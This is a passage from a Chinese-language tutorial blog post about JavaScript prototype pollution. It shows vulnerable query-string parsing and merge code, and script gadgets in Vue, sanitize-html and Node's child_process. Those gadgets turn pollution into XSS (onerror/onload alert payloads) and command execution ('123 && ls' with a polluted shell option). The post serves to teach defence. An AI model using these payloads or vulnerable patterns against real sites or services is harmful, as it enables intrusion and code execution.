punctuation\">.</span>innerText<br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> element<br><span class=\"token punctuation\">}</span></code></pre>\n<p>整份程式碼只差在開頭，多了一個 <code>Object.prototype.innerHTML = '&lt;img src=x onerror=alert(1)&gt;'</code>，而就因為這一行污染了 innerHTML，導致底下 <code>if (config.innerHTML) {</code> 的判斷變成 true，行為被改變，原本是用 <code>innerText</code>，現在改成用 <code>innerHTML</code>，最後就達成了 XSS！</p>\n<p>這就是由 prototype pollution 所引發的 XSS 攻擊。一般來說，prototype pollution 指的是程式有漏洞，導致攻擊者可以污染原型鏈上的屬性，但是除了污染以外，還必須找到可以影響的地方，加在一起才能形成完整的攻擊。</p>\n<p>此時的你應該很好奇，那到底怎樣的程式碼會有漏洞，居然能讓攻擊者去改原型鏈上的屬性。</p>\n<h2 id=\"prototype-pollution-%E6%98%AF%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\"><a class=\"direct-link\" href=\"#prototype-pollution-%E6%98%AF%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\">#</a> Prototype pollution 是怎麼發生的？</h2>\n<p>有兩個例子很常發生這種事情，第一個是解析 query string。</p>\n<p>你可能想說 query string 不就 <code>?a=1&amp;b=2</code> 這種類型，有什麼難的？但其實許多函式庫的 query string 都有支援陣列，像是 <code>?a=1&amp;a=2</code> 或是 <code>?a[]=1&amp;a[]=2</code> 都有可能被解析為陣列。</p>\n<p>除了陣列以外，有些甚至還支援物件，像是這樣：<code>?a[b][c]=1</code>，就會產生一個 <code>{a: {b: {c: 1}}}</code> 的物件出來。</p>\n<p>舉例來說，<a href=\"https://github.com/ljharb/qs#parsing-objects\">qs</a> 這個 library 就有支援物件的解析。</p>\n<p>今天如果是你要來負責這個功能，你會怎麼寫呢？我們可以寫一個只針對物件的陽春版本（先不考慮 URL encode 的情況，也不考慮陣列）：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">parseQs</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">qs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">let</span> arr <span class=\"token operator\">=</span> qs<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&amp;'</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> item <span class=\"token keyword\">of</span> arr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> item<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token comment\">// 針對一般的 key=value</span><br>      result<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> value<br>      <span class=\"token keyword\">continue</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token comment\">// 針對物件</span><br>    <span class=\"token keyword\">let</span> items <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">'['</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> result<br>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> items<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token keyword\">let</span> objKey <span class=\"token operator\">=</span> items<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">]$</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">===</span> items<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> value<br>      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>          obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>        obj <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">[</span>objKey<span class=\"token punctuation\">]</span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> result<br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token function\">parseQs</span><span class=\"token punctuation\">(</span><span class=\"token string\">'test=1&amp;a[b][c]=2'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>qs<span class=\"token punctuation\">)</span><br><span class=\"token comment\">// { test: '1', a: { b: { c: '2' } } }</span></code></pre>\n<p>基本上就是根據 <code>[]</code> 裡面的內容去構造出一個物件，一層一層去賦值，看起來沒什麼特別的。</p>\n<p>但是！如果我的 query string 長這樣，事情就不一樣了：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> qs <span class=\"token operator\">=</span> <span class=\"token function\">parseQs</span><span class=\"token punctuation\">(</span><span class=\"token string\">'__proto__[a]=3'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>qs<span class=\"token punctuation\">)</span> <span class=\"token comment\">// {}</span><br><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 3</span></code></pre>\n<p>當我的 query string 是這樣的時候，<code>parseQs</code> 就會去改變 <code>obj.__proto__.a</code> 的值，造成了 prototype pollution，導致我後來宣告一個空的物件，在印出 <code>obj.a</code> 的時候卻印出了 3，因為物件原型已經被污染了。</p>\n<p>有不少在解析 query string 的 library 都出過類似的問題，底下簡單舉幾個例子：</p>\n<ol>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651\">jquery-deparam</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-BACKBONEQUERYPARAMETERS-1290381\">backbone-query-parameters</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650\">jquery-query-object</a></li>\n</ol>\n<p>除了解析 query string 以外，另一個功能也很常發生這個問題，叫做合併物件，一個簡單的合併物件函式長得像這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span> b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> prop <span class=\"token keyword\">in</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>      a<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> b<span class=\"token punctuation\">[</span>prop<span class=\"token punctuation\">]</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span> <br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> config <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><br>  b<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    c<span class=\"token operator\">:</span> <span class=\"token number\">2</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> customConfig <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  b<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    d<span class=\"token operator\">:</span> <span class=\"token number\">3</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> customConfig<span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><br><span class=\"token comment\">// { a: 1, b: { c: 2, d: 3 } }</span></code></pre>\n<p>如果上面的 <code>customConfig</code> 是可以控制的，那就會發生問題：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> config <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><br>  b<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    c<span class=\"token operator\">:</span> <span class=\"token number\">2</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">var</span> customConfig <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{\"__proto__\": {\"a\": 1}}'</span><span class=\"token punctuation\">)</span><br><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> customConfig<span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span></code></pre>\n<p>這邊之所以用到 <code>JSON.parse</code>，是因為如果直接寫：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> customConfig <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  __proto__<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>是沒有用的，<code>customConfig</code> 只會是一個空物件而已。要用 <code>JSON.parse</code>，才能製造出一個「key 是 <code>__proto__</code>」的物件：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  __proto__<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>    a<span class=\"token operator\">:</span> <span class=\"token number\">1</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{\"__proto__\": {\"a\": 1}}'</span><span class=\"token punctuation\">)</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj1<span class=\"token punctuation\">)</span> <span class=\"token comment\">// {}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">)</span> <span class=\"token comment\">// { __proto__: { a: 1 } }</span></code></pre>\n<p>同樣地，也有許多 merge 相關的 library 曾經有這個漏洞，底下簡單列舉幾個：</p>\n<ol>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-MERGE-1040469\">merge</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173733\">lodash.merge</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643\">plain-object-merge </a></li>\n</ol>\n<p>除了這些以外，只要是操作物件相關的 library 基本上都出現過類似問題，像是：</p>\n<ol>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-IMMER-1019369\">immer</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536\">mootools</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-IOREDIS-1567196\">ioredis</a></li>\n</ol>\n<p>現在已經知道哪些地方容易發生 prototype pollution 的問題了，但如果只是污染原型上的屬性，是沒有用的，還需要找到能影響到的地方，也就是說，有哪些地方在屬性被污染以後，行為會改變，可以讓我們執行攻擊？</p>\n<h2 id=\"prototype-pollution-script-gadgets\"><a class=\"direct-link\" href=\"#prototype-pollution-script-gadgets\">#</a> Prototype pollution script gadgets</h2>\n<p>這些「只要我們污染了 prototype，就可以拿來利用的程式碼」叫做 script gadget，有一個 GitHub repo 專門搜集了這些 gadget：<a href=\"https://github.com/BlackFan/client-side-prototype-pollution\">Client-Side Prototype Pollution</a>，有些 gadget 可能是你想像不到的，我來示範一下（<a href=\"https://aszx87410.github.io/demo/prototype-pollution/vue.html\">demo 網頁</a>）：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://unpkg.com/vue/dist/vue.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    {{ message }}<br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token comment\">// 污染 template</span><br>    <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>template <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <br>      el<span class=\"token operator\">:</span> <span class=\"token string\">'#app'</span><span class=\"token punctuation\">,</span><br>      data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><br>        message<span class=\"token operator\">:</span> <span class=\"token string\">'Hello Vue!'</span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>一段看起來沒什麼的 Vue hello world，在我們污染了 <code>Object.prototype.template</code> 之後，就變成了 XSS，可以讓我們插入任意程式碼。</p>\n<p>或是像下面這樣（<a href=\"https://aszx87410.github.io/demo/prototype-pollution/vue.html\">demo 網頁</a>）：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class=\"token punctuation\">;</span><br>    document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">sanitizeHtml</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;div>hello&lt;/div>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>明明是做 sanitize 的 library，在污染了 <code>Object.prototype.innerText</code> 之後，就變成了 XSS 的好幫手。</p>\n<p>為什麼會有這些問題出現呢？以上面的 <code>sanitize-html</code> 為例，是因為有這一段程式碼：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">.</span>innerText <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>hasText <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>options<span class=\"token punctuation\">.</span>textFilter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    result <span class=\"token operator\">+=</span> frame<span class=\"token punctuation\">.</span>innerText<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>因為直接預設了 innerText 是安全的字串，所以就直接拼接上去，而我們污染了這個屬性，因此當這個屬性不存在時，就會用到 prototype 的值，最後變成了 XSS。</p>\n<p>除了 client side 以外，server side 的 Node.js 也有類似的風險，例如說這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> child_process <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'123'</span><span class=\"token punctuation\">]</span><br><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> child_process<span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><br>  <span class=\"token string\">'echo'</span><span class=\"token punctuation\">,</span> params<br><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 123</span></code></pre>\n<p>這是一段很單純的程式碼，執行 <code>echo</code> 指令然後傳入參數，這個參數會自動幫你做處理，所以不用擔心 command injection 的問題：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> child_process <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'123 &amp;&amp; ls'</span><span class=\"token punctuation\">]</span><br><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> child_process<span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><br>  <span class=\"token string\">'echo'</span><span class=\"token punctuation\">,</span> params<br><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 123 &amp;&amp; ls</span></code></pre>\n<p>但如果有一個 prototype pollution 的漏洞，就可以搖身一變成為 RCE（Remote code execution），讓攻擊者執行任意指令（假設攻擊者可以控制 params）：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> child_process <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">const</span> params <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'123 &amp;&amp; ls'</span><span class=\"token punctuation\">]</span><br><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>shell <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span> <span class=\"token comment\">// 只多了這行，參數的解析就會不一樣</span><br><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> child_process<span class=\"token punctuation\">.</span><span class=\"token function\">spawnSync</span><span class=\"token punctuation\">(</span><br>  <span class=\"token string\">'echo'</span><span class=\"token punctuation\">,</span> params<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>timeout<span class=\"token operator\">:</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">/*<br>123<br>index.js<br>node_modules<br>package-lock.json<br>package.json<br>*/</span></code></pre>\n<p>之所以會這樣，是因為 <code>child_process.spawn</code> 的第三個參數 options 中有一個選項叫做 <code>shell</code>，設為 true 以後會造成行為不同，而官網的<a href=\"https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options\">文件</a>也有寫說：</p>\n<blockquote>\n<p>If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.</p>\n</blockquote>\n<p>透過 prototype pollution 搭配 script gadget（<code>child_process.spawn</code>），成功製造出一個嚴重性極高的漏洞。</p>\n<h2 id=\"%E4%B8%AD%E5%A0%B4%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E4%B8%AD%E5%A0%B4%E7%B8%BD%E7%B5%90\">#</a> 中場總結</h2>\n<p>如果程式中存在某個功能，能讓攻擊者污染到 prototype 上面的屬性，這個漏洞就叫做 prototype pollution，而 prototype pollution 本身用途不大，需要跟其他的程式碼結合才能發揮作用，而可以跟他結合的程式碼就叫做 script gadget。</p>\n<p>例如說 Vue 的內部實作會根據某個物件的 <code>template</code> 這個屬性渲染出相對應的東西，於是我們只要污染 <code>Object.prototype.template</code>，就可以製造出一個 XSS 漏洞。或像是 <code>child_process.spawn</code> 用到了 <code>shell</code>，所以污染它以後就變成了 RCE 漏洞。</p>\n<p>要修復的其實並不是那些可以利用的 script gadget，除非你把每個物件取值的地方都改掉，但這其實也不是根治的方式。真正根治的方式，是杜絕掉 prototype pollution，讓 prototype 不會被污染，就沒有這些問題了。</p>\n<h2 id=\"%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\"><a class=\"direct-link\" href=\"#%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\">#</a> 該如何防禦</h2>\n<p>在 <a href=\"https://snyk.io/vuln/SNYK-JS-SWIPER-1088062\">snyk</a> 的任何一個 prototype pollution 漏洞頁面上都會有防禦建議，也可以參考這一篇：<a href=\"https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf\">Prototype pollution attack in NodeJS 